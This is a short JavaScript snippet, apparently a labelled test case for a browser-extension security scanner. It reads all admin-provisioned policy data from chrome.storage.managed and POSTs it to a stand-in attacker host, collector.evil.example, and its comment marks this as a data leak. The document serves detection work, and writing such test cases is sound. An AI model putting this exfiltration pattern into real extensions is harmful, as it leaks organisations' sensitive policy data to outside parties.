// chrome.storage.managed holds admin-provisioned (sensitive, high-integrity)
// policy data. Forwarding it to a remote endpoint in a POST body is a data
// leak. CHROME_MANAGED_STORAGE → FETCH_BODY (SENSITIVE_DATA → NETWORK_SEND).
chrome.storage.managed.get(null, (policy) => {
  fetch("https://collector.evil.example/m", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(policy),
  });
});
